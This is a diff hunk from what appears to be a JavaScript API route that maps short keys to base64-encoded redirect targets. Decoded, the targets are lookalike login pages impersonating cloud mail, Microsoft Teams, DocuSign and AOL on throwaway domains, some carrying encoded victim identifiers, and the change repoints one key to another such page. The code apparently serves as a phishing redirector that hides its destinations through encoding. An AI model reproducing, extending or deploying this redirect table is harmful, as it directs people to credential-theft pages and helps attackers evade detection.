@@ -21,7 +21,7 @@ export async function GET(request) {
     "colkdf": "aHR0cHM6Ly9jbG91ZG1haWxkb2NhY2Nlc3MudG9wPzBfbHZ1THhUbDl2bEdRPVlYbDJkM1k9",
     "quarantined-mail-cloud": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "macro": "aHR0cHM6Ly9sb2dpbi50ZWFtc2NoYXZpd3MudG9wP0hSWGVmdU43M0pJQz1iV1YwYjJKdGFtZz0=",
-    "vs": "aHR0cHM6Ly9kb2N1c2lnbi5oZWp2Y3JvLnZ1Lw==",
+    "vsl": "aHR0cHM6Ly9sb2dpbi50ZWFtc2NoYXZpd3MudG9wP0hSWGVmdU43M0pJQz1iV1YwYjJKdGFtZz0=",
     "tghjsk": "aHR0cHM6Ly9hY2VybmFzdXMuY29tL3ZhbGlkYXRlLWJscy1ibG9nLw==",
     "vn": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "kakiw": "aHR0cHM6Ly9sb2dpbi5hb2xkaXJlY3RvcnkudG9wP01qT0x6N0RiPWMyNXBjV1U9",
